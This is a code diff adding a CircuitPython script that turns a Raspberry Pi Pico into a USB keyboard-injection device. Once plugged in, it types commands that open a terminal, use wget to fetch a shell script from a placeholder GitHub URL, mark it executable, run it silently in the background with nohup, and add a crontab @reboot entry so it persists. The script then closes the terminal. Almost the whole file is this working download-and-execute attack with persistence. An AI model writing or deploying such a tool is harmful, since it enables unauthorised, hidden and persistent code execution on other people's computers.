@@ -1,0 +1,80 @@
+"""
+Raspberry Pi Pico as HID device - Auto-install script downloader
+Requires: CircuitPython, adafruit_hid library
+Install on Pico: https://learn.adafruit.com/welcome-to-circuitpython/installing-circuitpython
+"""
+
+import board
+import digitalio
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keycode import Keycode
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+
+# Initialize keyboard
+kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(kbd)
+
+# Configuration
+GITHUB_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/script.sh"
+SCRIPT_PATH = "/tmp/install_script.sh"
+
+# LED indicator (optional - remove if no LED connected)
+led = digitalio.DigitalInOut(board.LED)
+led.direction = digitalio.Direction.OUTPUT
+
+def type_command(cmd):
+    """Type a command via HID keyboard"""
+    layout.write(cmd)
+    kbd.press(Keycode.ENTER)
+    kbd.release(Keycode.ENTER)
+    time.sleep(0.5)
+
+def blink_led(times=1):
+    """Blink LED to indicate status"""
+    for _ in range(times):
+        led.value = True
+        time.sleep(0.2)
+        led.value = False
+        time.sleep(0.2)
+
+def main():
+    """Main execution sequence"""
+    time.sleep(2)  # Wait for system to recognize HID device
+    blink_led(1)   # Single blink = starting
+    
+    # Open terminal (adjust based on your Kali Linux setup)
+    # For most Linux systems with xdg-open or direct terminal launch
+    type_command("gnome-terminal -- bash &")
+    time.sleep(1)
+    
+    # Download script from GitHub
+    type_command(f"wget -O {SCRIPT_PATH} {GITHUB_URL}")
+    time.sleep(2)
+    
+    # Convert line endings (dos2unix equivalent)
+    type_command(f"sed -i 's/\\r$//' {SCRIPT_PATH}")
+    time.sleep(0.5)
+    
+    # Give execute permissions
+    type_command(f"chmod +x {SCRIPT_PATH}")
+    time.sleep(0.5)
+    
+    # Execute in background with nohup (survives terminal close)
+    type_command(f"nohup {SCRIPT_PATH} > /dev/null 2>&1 &")
+    time.sleep(1)
+    
+    # Add to crontab to run at startup
+    type_command("(crontab -l 2>/dev/null; echo '@reboot /bin/bash " + SCRIPT_PATH + " > /dev/null 2>&1') | crontab -")
+    time.sleep(1)
+    
+    # Optional: Close terminal quietly
+    type_command("exit")
+    time.sleep(0.5)
+    
+    blink_led(3)   # Triple blink = complete
+    print("Installation sequence complete!")
+
+if __name__ == "__main__":
+    main()
